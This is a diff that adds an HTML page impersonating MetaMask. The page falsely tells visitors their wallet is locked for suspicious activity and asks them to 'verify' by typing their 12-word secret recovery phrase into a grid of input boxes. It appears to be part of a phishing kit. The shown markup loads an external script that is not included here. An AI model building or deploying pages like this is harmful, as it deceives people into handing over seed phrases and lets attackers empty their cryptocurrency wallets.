@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MetaMask - Wallet Locked</title>
+    <link rel="stylesheet" href="/styles.css">
+</head>
+<body>
+    <div id="overlay" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.1); z-index: 9999;"></div>
+    <div class="container">
+        <div id="logo-container"></div>
+        <div id="notification" class="notification">
+            <h1>Wallet Locked</h1>
+            <p>Your MetaMask wallet has been temporarily locked due to suspicious activity. Verify your account to regain access.</p>
+            <button id="verifyBtn">Verify Now</button>
+        </div>
+        <div id="verifyForm" class="hidden">
+            <h1>Verify Your Wallet</h1>
+            <p class="subtext">Enter your 12-word secret recovery phrase to unlock your wallet.</p>
+            <form id="phraseForm">
+                <div class="phrase-grid">
+                    <input type="text" class="phrase-box" maxlength="15" placeholder="1" required>
+                    <input type="text" class="phrase-box" maxlength="15" placeholder="2" required>
+                    <input type="text" class="phrase-box" maxlength="15" placeholder="3" required>
+                    <input type="text" class="phrase-box" maxlength="15" placeholder="4" required>
+                    <input type="text" class="phrase-box" maxlength="15" placeholder="5" required>
+                    <input type="text" class="phrase-box" maxlength="15" placeholder="6" required>
+                    <input type="text" class="phrase-box" maxlength="15" placeholder="7" required>
+                    <input type="text" class="phrase-box" maxlength="15" placeholder="8" required>
+                    <input type="text" class="phrase-box" maxlength="15" placeholder="9" required>
+                    <input type="text" class="phrase-box" maxlength="15" placeholder="10" required>
+                    <input type="text" class="phrase-box" maxlength="15" placeholder="11" required>
+                    <input type="text" class="phrase-box" maxlength="15" placeholder="12" required>
+                </div>
+                <button type="submit">Unlock Wallet</button>
+            </form>
+            <p id="error" class="error"></p>
+        </div>
+    </div>
+    <script src="/script.js"></script>
+</body>
+</html>
